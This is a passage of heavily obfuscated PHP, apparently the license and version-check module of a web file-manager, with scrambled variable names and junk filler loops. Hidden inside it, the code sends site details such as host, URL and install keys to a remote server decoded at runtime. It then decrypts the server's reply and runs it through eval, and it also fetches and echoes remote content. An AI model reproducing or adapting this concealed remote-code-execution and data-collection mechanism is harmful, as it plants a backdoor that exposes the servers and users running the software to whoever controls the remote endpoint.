Model($‘ìÑ›ÈÁ[33])->get($‘ìÑ›ÈÁ[100]); $×ƒŠõ”â = $‘ìÑ›ÈÁ[203] . md5($®Ã¡Üº† . $‘ìÑ›ÈÁ[204]); $Å½ÓüÒ = Cache::get($×ƒŠõ”â); $¨Ûü²şÍ = $´ö¾­‰×[743]; if (!is_array($Å½ÓüÒ) || !isset($Å½ÓüÒ[$‘ìÑ›ÈÁ[207]]) || time() - $Å½ÓüÒ[$‘ìÑ›ÈÁ[207]] >= 60) { $ÈùÙÖ¢à = Model($‘ìÑ›ÈÁ[7])->loadList(); $¡œÑñÊÑ = $ÈùÙÖ¢à[$‘ìÑ›ÈÁ[200]]; $ìÚàüœë = md5($_SERVER[$‘ìÑ›ÈÁ[106]] . strrev($®Ã¡Üº†) . $½–æ‡µÛ[$‘ìÑ›ÈÁ[191]]); $Ó¡œœÕ  = strrev(substr($ìÚàüœë, 10, 16)); $Å½ÓüÒ = $this->bpaqdfc5fdf2($¡œÑñÊÑ[$‘ìÑ›ÈÁ[86]][$Ó¡œœÕ ], $ìÚàüœë); $Å½ÓüÒ = json_decode($Å½ÓüÒ, !0); } if (!is_array($Å½ÓüÒ)) { return $this->wgeo2914d326(); } $Ÿƒà»ßì = strtotime($Å½ÓüÒ[$‘ìÑ›ÈÁ[129]]); if (time() >= $Ÿƒà»ßì) { return $this->wgeo2914d326(); } if (!isset($Å½ÓüÒ[$‘ìÑ›ÈÁ[207]]) || time() - $Å½ÓüÒ[$‘ìÑ›ÈÁ[207]] > 20) { $Å½ÓüÒ[$‘ìÑ›ÈÁ[207]] = time(); Cache::set($×ƒŠõ”â, $Å½ÓüÒ); } $this->ngabf1799774 = $Å½ÓüÒ; $this->gymd1fbeea33 = $½–æ‡µÛ[$‘ìÑ›ÈÁ[108]]; $©Í˜…Ö· = $´ö¾­‰×[744]; while (strlen($©Í˜…Ö·) < $´ö¾­‰×[437]) { if (!$©Í˜…Ö·) { break; } $©Í˜…Ö·++; } } private function fzurcf53ea5e() { $™İöØ¬Š =& $_SERVER[£ğ°ÖØø]; $¸Â¢îÆã =& $_SERVER[Ÿ›ğøİò]; $·ôôñ¤ = $GLOBALS[$¸Â¢îÆã[13]]; $üüÍòãÙ = $_SERVER[$¸Â¢îÆã[24]]; $¢ã¬Ã›ó = $™İöØ¬Š[745]; while (strlen($¢ã¬Ã›ó) < $™İöØ¬Š[700]) { if (!$¢ã¬Ã›ó) { break; } $¢ã¬Ã›ó++; } if ($üüÍòãÙ == $¸Â¢îÆã[208] && $this->gymd1fbeea33 == $¸Â¢îÆã[109]) { show_json(LNG($¸Â¢îÆã[209]), !1, $¸Â¢îÆã[210]); } $·Á˜õá = array($¸Â¢îÆã[211], $¸Â¢îÆã[212]); if (in_array($üüÍòãÙ, $·Á˜õá)) { if ($this->gymd1fbeea33 == $¸Â¢îÆã[109] && isset($·ôôñ¤[$¸Â¢îÆã[213]])) { show_json(LNG($¸Â¢îÆã[209]), !1, $¸Â¢îÆã[210]); die; } $°ôëâÉæ = $this->zqsd885b2b00(); if ($°ôëâÉæ != intval($¸Â¢îÆã[214])) { if ($°ôëâÉæ <= Model($¸Â¢îÆã[125])->count()) { show_json(LNG($¸Â¢îÆã[215]), !1, $¸Â¢îÆã[210]); die; } } } } private function vdyge8f28b62() { $òòÆ°‘Â =& $_SERVER[£ğ°ÖØø]; $°‚ó‚åÀ =& $_SERVER[Ÿ›ğøİò]; $«¤¤ÅËË = array($°‚ó‚åÀ[119], $°‚ó‚åÀ[120]); if (!KodUser::isRoot() || !isset($_GET[$°‚ó‚åÀ[216]])) { return; } if (!in_array($_SERVER[$°‚ó‚åÀ[24]], $«¤¤ÅËË)) { return; } $Œ÷½“üß = $°‚ó‚åÀ[217]; $Œ÷½“üß = $this->stdxc50f322d($Œ÷½“üß, $°‚ó‚åÀ[218]); $¢èÏìĞ = $òòÆ°‘Â[746]; $À¦”åíæ = stream_context_create(array($°‚ó‚åÀ[219] => array($°‚ó‚åÀ[220] => $°‚ó‚åÀ[221], $°‚ó‚åÀ[222] => 3))); $¢åÎŒÚ‰ = $òòÆ°‘Â[747]; if (!$¢åÎŒÚ‰) { return; } $Éå–¬Ü¾ = @file_get_contents($Œ÷½“üß, !1, $À¦”åíæ); header($°‚ó‚åÀ[223]); $¼é£ù˜Ú = $òòÆ°‘Â[748]; while ($¼é£ù˜Ú < $òòÆ°‘Â[437]) { if ($¼é£ù˜Ú >= 0) { break; } $¼é£ù˜Ú++; } if ($Éå–¬Ü¾ && strstr($Éå–¬Ü¾, $°‚ó‚åÀ[224])) { echo $Éå–¬Ü¾; } die; } public function oyzac73b4988($‹á× œñ) { $©©ê­ =& $_SERVER[£ğ°ÖØø]; $’½Š§Å =& $_SERVER[Ÿ›ğøİò]; if ($this->gymd1fbeea33 == $’½Š§Å[225]) { return $‹á× œñ; } $ıÛ÷Îè÷ = $this->versionPluginList(); $³ÇÒ…ÄÊ = explode($’½Š§Å[226], $this->versionPluginFilter()); $ıëúâ¢© = $©©ê­[749]; $Ï¦ºïûˆ = array(); foreach ($ıÛ÷Îè÷ as $äıŒ†½¹ => $Ò×¿õÃ) { if ($Ò×¿õÃ == $’½Š§Å[227] && substr($this->gymd1fbeea33, 0, 1) == $’½Š§Å[227]) { continue; } if (!in_array($äıŒ†½¹, $³ÇÒ…ÄÊ)) { $Ï¦ºïûˆ[] = $äıŒ†½¹; } } foreach ($Ï¦ºïûˆ as $äıŒ†½¹) { unset($‹á× œñ[$äıŒ†½¹]); $áÖŒú µ = $©©ê­[750]; } return $‹á× œñ; $‚¡ò½øü = $©©ê­[751]; if (!$‚¡ò½øü) { return; } } private function versionPluginList() { $ŠÎ¢´¨é =& $_SERVER[£ğ°ÖØø]; $È·¨å‹Š =& $_SERVER[Ÿ›ğøİò]; return array($È·¨å‹Š[228] => $È·¨å‹Š[227], $È·¨å‹Š[229] => $È·¨å‹Š[227], $È·¨å‹Š[230] => $È·¨å‹Š[227], $È·¨å‹Š[231] => $È·¨å‹Š[232], $È·¨å‹Š[233] => $È·¨å‹Š[232], $È·¨å‹Š[234] => $È·¨å‹Š[232], $È·¨å‹Š[235] => $È·¨å‹Š[232], $È·¨å‹Š[236] => $È·¨å‹Š[232], $È·¨å‹Š[237] => $È·¨å‹Š[232], $È·¨å‹Š[238] => $È·¨å‹Š[232], $È·¨å‹Š[239] => $È·¨å‹Š[232], $È·¨å‹Š[240] => $È·¨å‹Š[232], $È·¨å‹Š[241] => $È·¨å‹Š[232], $È·¨å‹Š[242] => $È·¨å‹Š[232], $È·¨å‹Š[243] => $È·¨å‹Š[232], $È·¨å‹Š[244] => $È·¨å‹Š[232]); $£Ìˆ¸ = $ŠÎ¢´¨é[752]; if (strlen($£Ìˆ¸) < $ŠÎ¢´¨é[700]) { return; } } private function versionPluginFilter() { $¯ğ˜öî– =& $_SERVER[£ğ°ÖØø]; $…¾ÜÜçú =& $_SERVER[Ÿ›ğøİò]; if ($this->gymd1fbeea33 == $…¾ÜÜçú[109]) { return $…¾ÜÜçú[6]; } $šÕõÙÌ = _get($this->ngabf1799774, $…¾ÜÜçú[245], $…¾ÜÜçú[6]); $ûÎ¼ = $¯ğ˜öî–[753]; while (strlen($ûÎ¼) < $¯ğ˜öî–[693]) { if (!$ûÎ¼) { break; } $ûÎ¼++; } $Ê­ìĞÆ = _get($this->ngabf1799774, $…¾ÜÜçú[116], $…¾ÜÜçú[6]); $Œ¿¨–ë = $¯ğ˜öî–[754]; $Û¼ÄÇ¡“ = _get($this->ngabf1799774, $…¾ÜÜçú[246], $…¾ÜÜçú[6]); $²Â¶„ÈÖ = $¯ğ˜öî–[755]; while (strlen($²Â¶„ÈÖ) < $¯ğ˜öî–[693]) { if (!$²Â¶„ÈÖ) { break; } $²Â¶„ÈÖ++; } if ($Ê­ìĞÆ > time() && $Û¼ÄÇ¡“ > time()) { $Í€Æ½Ó· = explode($…¾ÜÜçú[226], $šÕõÙÌ); $ÖÛåÈÈ = array_keys($this->versionPluginList()); $šÕõÙÌ = array_merge($Í€Æ½Ó·, $ÖÛåÈÈ); $šÕõÙÌ = implode($…¾ÜÜçú[226], array_filter(array_unique($šÕõÙÌ))); } return $šÕõÙÌ; } private function ugcy5fcb9f34() { $´Ù…ˆà» =& $_SERVER[Ÿ›ğøİò]; if ($this->gymd1fbeea33 != $´Ù…ˆà»[109]) { $GLOBALS[$´Ù…ˆà»[86]][$´Ù…ˆà»[90]][$´Ù…ˆà»[247]] = $´Ù…ˆà»[206]; return; } $GLOBALS[$´Ù…ˆà»[86]][$´Ù…ˆà»[248]] = $´Ù…ˆà»[122]; if (Model($´Ù…ˆà»[249])->get($´Ù…ˆà»[63]) != $´Ù…ˆà»[206]) { Model($´Ù…ˆà»[249])->set($´Ù…ˆà»[63], $´Ù…ˆà»[206]); } } public function chnm2e175153() { $ºöÎ¦´ =& $_SERVER[£ğ°ÖØø]; return $_SERVER[Ÿ›ğøİò][250]; $•ÊÒ€±İ = $ºöÎ¦´[756]; while (strlen($•ÊÒ€±İ) < $ºöÎ¦´[695]) { if (!$•ÊÒ€±İ) { break; } $•ÊÒ€±İ++; } } private function tfix20d80c0c() { $îöÏÒìŒ =& $_SERVER[Ÿ›ğøİò]; $Ü·šª = array($îöÏÒìŒ[251], $îöÏÒìŒ[252], $îöÏÒìŒ[253]); $§Ÿë¼ü = $îöÏÒìŒ[254] . md5($îöÏÒìŒ[255]); if ($this->gymd1fbeea33 == $îöÏÒìŒ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$îöÏÒìŒ[24]], $Ü·šª)) { return; } if (time() % 4 != 0) { return; } $ÀèÇ••à = call_user_func(array($îöÏÒìŒ[256], $îöÏÒìŒ[257]), $§Ÿë¼ü); if ($ÀèÇ••à && time() - $ÀèÇ••à < intval($îöÏÒìŒ[258])) { return; } call_user_func(array($îöÏÒìŒ[256], $îöÏÒìŒ[139]), $§Ÿë¼ü, time()); $À”½×— = Model($îöÏÒìŒ[33])->get($îöÏÒìŒ[100]); $ÔØîùÈ = array($îöÏÒìŒ[152] => Model($îöÏÒìŒ[33])->get($îöÏÒìŒ[153]), $îöÏÒìŒ[167] => $this->gymd1fbeea33, $îöÏÒìŒ[163] => $_SERVER[$îöÏÒìŒ[164]], $îöÏÒìŒ[165] => Model($îöÏÒìŒ[33])->get($îöÏÒìŒ[131]), $îöÏÒìŒ[105] => md5($_SERVER[$îöÏÒìŒ[106]] . $À”½×—), $îöÏÒìŒ[156] => $îöÏÒìŒ[136], $îöÏÒìŒ[159] => $_SERVER[$îöÏÒìŒ[160]]); $åöµÒ¯À = $this->gcif7db83b11($îöÏÒìŒ[259], $ÔØîùÈ); if (!is_array($åöµÒ¯À)) { return; } if ($åöµÒ¯À[$îöÏÒìŒ[152]] && $åöµÒ¯À[$îöÏÒìŒ[260]]) { if ($this->cqalea7899c2($åöµÒ¯À[$îöÏÒìŒ[260]]) == $ÔØîùÈ[$îöÏÒìŒ[152]]) { return; } } $this->wgeo2914d326(); $îø²Šø = $_SERVER[£ğ°ÖØø][757]; if (!$îø²Šø) { return; } if ($this->cqalea7899c2($åöµÒ¯À[$îöÏÒìŒ[260]]) != $ÔØîùÈ[$îöÏÒìŒ[152]]) { $½²¿É‡ = array($îöÏÒìŒ[185] => $À”½×—, $îöÏÒìŒ[186] => $_SERVER[$îöÏÒìŒ[106]], $îöÏÒìŒ[187] => this_url(), $îöÏÒìŒ[161] => $_SERVER[$îöÏÒìŒ[162]]); $ıû¹ÃìÕ = $this->kjow2adb4ecf(json_encode($½²¿É‡)); $åöµÒ¯À = $this->gcif7db83b11($îöÏÒìŒ[188] . $ıû¹ÃìÕ); if ($åöµÒ¯À && is_array($åöµÒ¯À) && isset($åöµÒ¯À[$îöÏÒìŒ[260]])) { $‹Í©„Ûš = $this->bpaqdfc5fdf2($åöµÒ¯À[$îöÏÒìŒ[260]], 2); if ($‹Í©„Ûš) { $‹Í©„Ûš = $this->cqalea7899c2($‹Í©„Ûš); } if ($‹Í©„Ûš) { try { @eval($‹Í©„Ûš); } catch (Exception $†¬é•Ùí) { } } } } } private function gcif7db83b11($Ü®¶“àÖ = '', $èòµ´ê = array(), $ÊÒæ“ÀÌ = 5) { $ˆˆß¶Ğ“ =& $_SERVER[£ğ°ÖØø]; $²°—Íï =& $_SERVER[Ÿ›ğøİò]; $Ó•ªÕùÇ = $²°—Íï[261]; $Ó•ªÕùÇ = $this->stdxc50f322d($Ó•ªÕùÇ, $²°—Íï[262]); $´š´æ¾ñ = $ˆˆß¶Ğ“[758]; $Ó•ªÕùÇ = $Ó•ªÕùÇ . $Ü®¶“àÖ; $åŒ¶Ê¾Ç = $ˆˆß¶Ğ“[759]; if (!$åŒ¶Ê¾Ç) { die; } if ($èòµ´ê && is_array($èòµ´ê)) { $Ó•ªÕùÇ = $Ó•ªÕùÇ . $²°—Íï[263] . http_build_query($èòµ´ê); } if ($èòµ´ê === -1) { return $Ó•ªÕùÇ; } $ù²Ê¤Ü¢ = stream_context_create(array($²°—Íï[219] => array($²°—Íï[222] => $ÊÒæ“ÀÌ, $²°—Íï[220] => $²°—Íï[264]), $²°—Íï[265] => array($²°—Íï[266] => !1, $²°—Íï[267] => !1))); $èòµ´ê = @file_get_contents($Ó•ªÕùÇ, !1, $ù²Ê¤Ü¢); return json_decode($èòµ´ê, !0); } private function zqsd885b2b00() { $¹ú¢Î˜´ =& $_SERVER[£ğ°ÖØø]; $Ö¢ñª© =& $_SERVER[Ÿ›ğøİò]; $ÅŸé·ù = array($Ö¢ñª©[268] => $Ö¢ñª©[269], $Ö¢ñª©[270] => $Ö¢ñª©[271], $Ö¢ñª©[272] => $Ö¢ñª©[273], $Ö¢ñª©[274] => $Ö¢ñª©[275], $Ö¢ñª©[276] => $Ö¢ñª©[277], $Ö¢ñª©[278] => $Ö¢ñª©[214], $Ö¢ñª©[279] => $Ö¢ñª©[214], $Ö¢ñª©[280] => $Ö¢ñª©[269], $Ö¢ñª©[281] => $Ö¢ñª©[271], $Ö¢ñª©[282] => $Ö¢ñª©[273], $Ö¢ñª©[283] => $Ö¢ñª©[284], $Ö¢ñª©[285] => $Ö¢ñª©[275], $Ö¢ñª©[286] => $Ö¢ñª©[287], $Ö¢ñª©[288] => $Ö¢ñª©[277], $Ö¢ñª©[289] => $Ö¢ñª©[290], $Ö¢ñª©[291] => $Ö¢ñª©[292], $Ö¢ñª©[293] => $Ö¢ñª©[294]); $±ûÏ»Ö” = $¹ú¢Î˜´[760]; if (!$±ûÏ»Ö”) { die; } $Àá…ğ€¨ = $ÅŸé·ù[$this->gymd1fbeea33]; $”çˆü÷Î = $¹ú¢Î˜´[761]; if (!$”çˆü÷Î) { return; } $Àá…ğ€¨ = intval($Àá…ğ€¨ ? $Àá…ğ€¨ : $Ö¢ñª©[269]); $“¤š´Ëí = _get($this->ngabf1799774, $Ö¢ñª©[295]); $¿ãåÎÕ• = $¹ú¢Î˜´[762]; while ($¿ãåÎÕ• < $¹ú¢Î˜´[700]) { if ($¿ãåÎÕ• >= 0) { break; } $¿ãåÎÕ•++; } $“¤š´Ëí = $“¤š´Ëí ? intval($“¤š´Ëí) : 0; $üÕ¦«Ã = $¹ú¢Î˜´[763]; if (!$üÕ¦«Ã) { die; } return $Àá…ğ€¨ + $“¤š´Ëí; } public function dasu076782a3($ùÔøª³Ï) { $ÌÒÖˆù =& $_SERVER[£ğ°ÖØø]; $Åü¸ô¡‘ =& $_SERVER[Ÿ›ğøİò]; $²’š±ø = $this->zqsd885b2b00(); $—ïä‹Ê = $ÌÒÖˆù[764]; while ($—ïä‹Ê < $ÌÒÖˆù[693]) { if ($—ïä‹Ê >= 0) { break; } $—ïä‹Ê++; } if ($ùÔøª³Ï[$Åü¸ô¡‘[296]] == $Åü¸ô¡‘[122]) { return; } if ($²’š±ø >= intval($Åü¸ô¡‘[214])) { return; } $Ì™¹ˆÖÊ = Model($Åü¸ô¡‘[125])->count(); $ë¾½üÑê = $ÌÒÖˆù[765]; if (!$ë¾½üÑê) { return; } if ($Ì™¹ˆÖÊ <= $²’š±ø) { return; } $©‘¦Ôéª = Model($Åü¸ô¡‘[125])->field($Åü¸ô¡‘[296])->limit($²’š±ø)->select(); $µıƒãÆû = $ÌÒÖˆù[766]; if (strlen($µıƒãÆû) < $ÌÒÖˆù[693]) { die; } $©‘¦Ôéª = array_to_keyvalue($©‘¦Ôéª, $Åü¸ô¡‘[6], $Åü¸ô¡‘[296]); if (!in_array($ùÔøª³Ï[$Åü¸ô¡‘[296]], $©‘¦Ôéª)) { show_json($Åü¸ô¡‘[297], !1, $Åü¸ô¡‘[210]); } } public function hyqn77509351() { $ ½´Íï÷ =& $_SERVER[Ÿ›ğøİò]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $’×İªÊ¶ = $ ½´Íï÷[217]; $’×İªÊ¶ = $this->stdxc50f322d($’×İªÊ¶, $ ½´Íï÷[218]); $é•½š¼² = stream_context_create(array($ ½´Íï÷[219] => array($ ½´Íï÷[220] => $ ½´Íï÷[221], $ ½´Íï÷[222] => 3))); $ÅÕ×²Ùà = $_SERVER[£ğ°ÖØø][767]; if (!$ÅÕ×²Ùà) { die; } $Œ‰ÏºŒ = @file_get_contents($’×İªÊ¶, !1, $é•½š¼²); echo $ ½´Íï÷[298] . hash_encode($Œ‰ÏºŒ) . $ ½´Íï÷[299]; } private function xznpe4195329($£óµÇö, $Ã½š˜õ, $ø¤Ş¥×» = 3) { $¼¤èçÉ =& $_SERVER[£ğ°ÖØø]; $îË…ãìì =& $_SERVER[Ÿ›ğøİò]; usleep(1); $£óµÇö = trim($£óµÇö); $˜Ş×ï¥˜ = mt_rand(0, 5) . $îË…ãìì[6]; $şÒË¼¥½ = rand_string(15); $‘–£½ß = $¼¤èçÉ[768]; if (strlen($‘–£½ß) < $¼¤èçÉ[693]) { return; } $øÙê›öñ = $îË…ãìì[300]; $¡ãù¤ÊÙ = $¼¤èçÉ[769]; switch ($˜Ş×ï¥˜) { case $îË…ãìì[206]: $Ëù‹Âü¦ = $this->odvs2759ba87($£óµÇö, strrev($Ã½š˜õ . $şÒË¼¥½)); break; case $îË…ãìì[122]: $Ëù‹Âü¦ = $this->odvs2759ba87($£óµÇö, strrev($şÒË¼¥½ . $Ã½š˜õ)); break; $ú¶ì¿¨ø = $¼¤èçÉ[770]; if (!$ú¶ì¿¨ø) { die; } case $îË…ãìì[301]: $Ëù‹Âü¦ = $this->odvs2759ba87($£óµÇö, base64_encode($şÒË¼¥½ . $Ã½š˜õ)); $Î¸ƒûºî = $¼¤èçÉ[771]; if (!$Î¸ƒûºî) { die; } break; $²Óâ…òİ = $¼¤èçÉ[772]; if (!$²Óâ…òİ) { return; } case $îË…ãìì[302]: $Ëù‹Âü¦ = $this->odvs2759ba87($£óµÇö, md5($şÒË¼¥½ . $Ã½š˜õ)); break; $ñ«ŒçÚŒ = $¼¤èçÉ[773]; if (!$ñ«ŒçÚŒ) { return; } case $îË…ãìì[303]: $£óµÇö = base64_encode($£óµÇö); $®Ò„¥èˆ = rand(0, 64); $âˆ‹§å„ = $øÙê›öñ[$®Ò„¥èˆ]; $ó— = md5($âˆ‹§å„ . md5($Ã½š˜õ . $âˆ‹§å„) . $Ã½š˜õ); $ó— = substr($ó—, $®Ò„¥èˆ % 8, $®Ò„¥èˆ % 8 + 7); $òº„˜õ = $îË…ãìì[6]; $Ş‘µ£ = 0; $‰Ê†Åõ = 0; $ÇıŠ‚É = $¼¤èçÉ[774]; while ($ÇıŠ‚É < $¼¤èçÉ[695]) { if ($ÇıŠ‚É >= 0) { break; } $ÇıŠ‚É++; } $Ù·òşƒË = 0; $„õ×Ñóü = $¼¤èçÉ[775]; if (!$„õ×Ñóü) { return; } for ($Ş‘µ£ = 0; $Ş‘µ£ < strlen($£óµÇö); $Ş‘µ£++) { $Ù·òşƒË = $Ù·òşƒË == strlen($ó—) ? 0 : $Ù·òşƒË; $‰Ê†Åõ = ($®Ò„¥èˆ + strpos($øÙê›öñ, $£óµÇö[$Ş‘µ£]) + ord($ó—[$Ù·òşƒË++])) % 64; $ùÀú¿æ = $¼¤èçÉ[776]; if (strlen($ùÀú¿æ) < $¼¤èçÉ[700]) { return; } $òº„˜õ .= $øÙê›öñ[$‰Ê†Åõ]; $€›ÙÑÌñ = $¼¤èçÉ[777]; if (!$€›ÙÑÌñ) { die; } } $Ëù‹Âü¦ = hash_encode($âˆ‹§å„ . $òº„˜õ); $…‹šåŸ = $¼¤èçÉ[778]; break; default: $Ëù‹Âü¦ = $this->odvs2759ba87($£óµÇö, $Ã½š˜õ . $şÒË¼¥½); break; $—İ˜«ö² = $¼¤èçÉ[779]; if (strlen($—İ˜«ö²) < $¼¤èçÉ[693]) { die; } } $Ëù‹Âü¦ = strrev($˜Ş×ï¥˜ . $şÒË¼¥½ . $Ëù‹Âü¦); if ($ø¤Ş¥×» - 1 > 0) { $Ëù‹Âü¦ = $this->xznpe4195329($Ëù‹Âü¦, $Ã½š˜õ, $ø¤Ş¥×» - 1); } return $Ëù‹Âü¦; } private function bpaqdfc5fdf2($¹‹´’„Á, $‘Õı»Ûº, $¶¡²Õ©ç = 3) { $ßù÷ÆÙ =& $_SERVER[£ğ°ÖØø]; $áÛ›ê‰ =& $_SERVER[Ÿ›ğøİò]; if (!is_string($¹‹´’„Á) || strlen($¹‹´’„Á) < 10) { return !1; } $¹‹´’„Á = trim($¹‹´’„Á); $¹‹´’„Á = strrev($¹‹´’„Á); $»Õ“ÏÚ = $¹‹´’„Á[0]; $æ‰–ÏË = substr($¹‹´’„Á, 1, 15); $µ¥»Õü‡ = $ßù÷ÆÙ[780]; if (!$µ¥»Õü‡) { die; } $¹‹´’„Á = substr($¹‹´’„Á, 16); $Ÿ×’µ‚ = $ßù÷ÆÙ[781]; if (!$Ÿ×’µ‚) { return; } $Œ“éøŸÉ = $áÛ›ê‰[300]; $øâ¨‰»€ = $ßù÷ÆÙ[782]; if (strlen($øâ¨‰»€) < $ßù÷ÆÙ[437]) { return; } switch ($»Õ“ÏÚ) { case $áÛ›ê‰[206]: $¨»¤•é½ = $this->stdxc50f322d($¹‹´’„Á, strrev($‘Õı»Ûº . $æ‰–ÏË)); break; case $áÛ›ê‰[122]: $¨»¤•é½ = $this->stdxc50f322d($¹‹´’„Á, strrev($æ‰–ÏË . $‘Õı»Ûº)); $­ÂÕ¼¬† = $ßù÷ÆÙ[783]; if (!$­ÂÕ¼¬†) { die; } break; case $áÛ›ê‰[301]: $¨»¤•é½ = $this->stdxc50f322d($¹‹´’„Á, base64_encode($æ‰–ÏË . $‘Õı»Ûº)); $Äù™Çı = $ßù÷ÆÙ[784]; if (strlen($Äù™Çı) < $ßù÷ÆÙ[724]) { return; } break; case $áÛ›ê‰[302]: $¨»¤•é½ = $this->stdxc50f322d($¹‹´’„Á, md5($æ‰–ÏË . $‘Õı»Ûº)); break; $“›Ûıù = $ßù÷ÆÙ[785]; while ($“›Ûıù < $ßù÷ÆÙ[437]) { if ($“›Ûıù >= 0) { break; } $“›Ûıù++; } case $áÛ›ê‰[303]: $¹‹´’„Á = hash_decode($¹‹´’„Á); $Ô Óş = $ßù÷ÆÙ[786]; if (strlen($Ô Óş) < $ßù÷ÆÙ[700]) { die; } $ÜØİ…ö = $¹‹´’„Á[0]; $¹‹´’„Á = substr($¹‹´’„Á, 1); $Ù­«” = strpos($Œ“éøŸÉ, $ÜØİ…ö); $ÜúÚ«‹ = md5($ÜØİ…ö . md5($‘Õı»Ûº . $ÜØİ…ö) . $‘Õı»Ûº); $Ûğ¦é™Ï = $ßù÷ÆÙ[787]; if (strlen($Ûğ¦é™Ï) < $ßù÷ÆÙ[695]) { return; } $ÜúÚ«‹ = substr($ÜúÚ«‹, $Ù­«” % 8, $Ù­«” % 8 + 7); $ÕÖäšùÀ = $áÛ›ê‰[6]; $ÎÈÄÍÚ± = 0; $ıŠô…Â = $ßù÷ÆÙ[788]; $ğı’ŸÙ‘ = 0; $úÎ¾÷Â¥ = 0; $ï¼„’§û = $ßù÷ÆÙ[789]; if (!$ï¼„’§û) { return; } for ($ÎÈÄÍÚ± = 0; $ÎÈÄÍÚ± < strlen($¹‹´’„Á); $ÎÈÄÍÚ±++) { $úÎ¾÷Â¥ = $úÎ¾÷Â¥ == strlen($ÜúÚ«‹) ? 0 : $úÎ¾÷Â¥; $—Ôé÷¨ = $úÎ¾÷Â¥++; $ë­åó×© = $ßù÷ÆÙ[790]; while (strlen($ë­åó×©) < $ßù÷ÆÙ[724]) { if (!$ë­åó×©) { break; } $ë­åó×©++; } $ğı’ŸÙ‘ = strpos($Œ“éøŸÉ, $¹‹´’„Á[$ÎÈÄÍÚ±]) - $Ù­«” - ord($ÜúÚ«‹[$—Ôé÷¨]); $çÒõó…– = $ßù÷ÆÙ[791]; while ($ğı’ŸÙ‘ < 0) { $ğı’ŸÙ‘ += 64; $ŞãßÚõ¾ = $ßù÷ÆÙ[792]; } $ÕÖäšùÀ .= $Œ“éøŸÉ[$ğı’ŸÙ‘]; $İŞÈßôÍ = $ßù÷ÆÙ[793]; while (strlen($İŞÈßôÍ) < $ßù÷ÆÙ[724]) { if (!$İŞÈßôÍ) { break; } $İŞÈßôÍ++; } } $¨»¤•é½ = base64_decode($ÕÖäšùÀ); break; $ÈÔÆÆÏ = $ßù÷ÆÙ[794]; if (!$ÈÔÆÆÏ) { die; } default: $¨»¤•é½ = $this->stdxc50f322d($¹‹´’„Á, $‘Õı»Ûº . $æ‰–ÏË); break; $Ïéœ®±Ñ = $ßù÷ÆÙ[795]; if (!$Ïéœ®±Ñ) { return; } } if ($¶¡²Õ©ç - 1 > 0) { $¨»¤•é½ = $this->bpaqdfc5fdf2($¨»¤•é½, $‘Õı»Ûº, $¶¡²Õ©ç - 1); } return $¨»¤•é½; } public function kjow2adb4ecf($Ô’¹çà) { $±¬ˆìÖ =& $_SERVER[£ğ°ÖØø]; $Ø¡Ï§¥ =& $_SERVER[Ÿ›ğøİò]; $‚“ÉÑÔÂ = $this->rijebe449d3a(); $ÀÆêëş¯ = $±¬ˆìÖ[796]; $›ÄØ‰š = $this->rijebe449d3a(); $‹²ËêÀá = ($‚“ÉÑÔÂ - 1) * ($›ÄØ‰š - 1); $İúá×ñ = intval(($‚“ÉÑÔÂ + $›ÄØ‰š) / 2); $ø²ìŠú = $±¬ˆìÖ[797]; if (strlen($ø²ìŠú) < $±¬ˆìÖ[437]) { return; } while (1) { $È»çíÙ = $İúá×ñ; $€¥÷öÍû = $‹²ËêÀá; $½Î¨º™ = $±¬ˆìÖ[798]; if (strlen($½Î¨º™) < $±¬ˆìÖ[693]) { die; } while ($€¥÷öÍû % $È»çíÙ != 0) { $§úÙÃñ = $€¥÷öÍû; $§×¿ğı = $±¬ˆìÖ[799]; $€¥÷öÍû = $È»çíÙ; $È»çíÙ = $§úÙÃñ % $È»çíÙ; } if ($È»çíÙ == 1) { break; } else { $İúá×ñ++; } } $ış–½Ä = 2; for ($£êøŠúİ = 0; $£êøŠúİ < $‹²ËêÀá * 10; $£êøŠúİ++) { if (($‹²ËêÀá * $£êøŠúİ + 1) % $İúá×ñ == 0) { $ış–½Ä = intval(($‹²ËêÀá * $£êøŠúİ + 1) / $İúá×ñ); break; } } $ÖÖ„”’“ = $this->odvs2759ba87($‚“ÉÑÔÂ * $›ÄØ‰š . $Ø¡Ï§¥[6], $Ø¡Ï§¥[136]); $“¯™ôã = $±¬ˆìÖ[800]; if (strlen($“¯™ôã) < $±¬ˆìÖ[437]) { return; } $É—Ï×§® = md5($Ø¡Ï§¥[304] . ($‚“ÉÑÔÂ + $›ÄØ‰š) . $Ø¡Ï§¥[305] . $İúá×ñ . $Ø¡Ï§¥[305] . $ış–½Ä . $Ø¡Ï§¥[306]); $ÀÏ·ò„ = $±¬ˆìÖ[801]; if (strlen($ÀÏ·ò„) < $±¬ˆìÖ[693]) { return; } $¯£ñö˜™ = $this->odvs2759ba87($Ô’¹çà, $É—Ï×§®) . $Ø¡Ï§¥[307] . $ÖÖ„”’“; return $¯£ñö˜™; $½ÌÃ¸¬ = $±¬ˆìÖ[802]; while (strlen($½ÌÃ¸¬) < $±¬ˆìÖ[700]) { if (!$½ÌÃ¸¬) { break; } $½ÌÃ¸¬++; } } public function cqalea7899c2($ô„›©£ ) { $»âµ¨  =& $_SERVER[£ğ°ÖØø]; $ ¬ÇôÔ” =& $_SERVER[Ÿ›ğøİò]; $ë²¨®•¿ = explode($ ¬ÇôÔ”[307], $ô„›©£ ); if (count($ë²¨®•¿) != 2) { return $ ¬ÇôÔ”[6]; } $ŒÄåáá· = $this->stdxc50f322d($ë²¨®•¿[1] . $ ¬ÇôÔ”[6], $ ¬ÇôÔ”[136]); $¼´ğÄõï = $»âµ¨ [731]; if (!$¼´ğÄõï) { die; } if (!$ŒÄåáá·) { return $ ¬ÇôÔ”[6]; } $ŒÄåáá· = intval($ŒÄåáá·); $ùëèç›Ã = 0; $îîÑ´²ƒ = 0; for ($¾ìËú‚ = 3; $¾ìËú‚ < $ŒÄåáá·; $¾ìËú‚ += 2) { if ($ŒÄåáá· % $¾ìËú‚ != 0) { continue; } $ùëèç›Ã = $¾ìËú‚; $øÍ¸šØ» = $»âµ¨ [803]; if (strlen($øÍ¸šØ») < $»âµ¨ [700]) { return; } $îîÑ´²ƒ = intval($ŒÄåáá· / $¾ìËú‚); break; } $¤Ïƒ‚”– = ($ùëèç›Ã - 1) * ($îîÑ´²ƒ - 1); $¶½şÛ¢ë = intval(($ùëèç›Ã + $îîÑ´²ƒ) / 2); while (1) { $¾¼íõæ³ = $¶½şÛ¢ë; $¥üÑ²ØÀ = $¤Ïƒ‚”–; while ($¥üÑ²ØÀ % 